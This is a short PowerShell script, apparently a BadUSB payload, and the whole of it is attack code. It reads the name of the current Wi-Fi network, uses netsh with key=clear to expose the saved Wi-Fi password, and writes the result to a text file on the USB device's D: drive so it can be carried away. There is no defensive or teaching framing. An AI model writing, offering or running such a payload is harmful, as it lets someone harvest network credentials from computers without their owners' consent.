#get the name of the current network connection
$sid = (Get-NetConnectionProfile).Name

#retrieve the Wi-Fi passwords stored on the computer
$wifiPasswords = netsh wlan show profiles name=$sid key=clear

#save output into .txt file(D: drive = BadUsb) 
Out-File -FilePath "D:\wifi_passwords.txt" -InputObject $wifiPasswords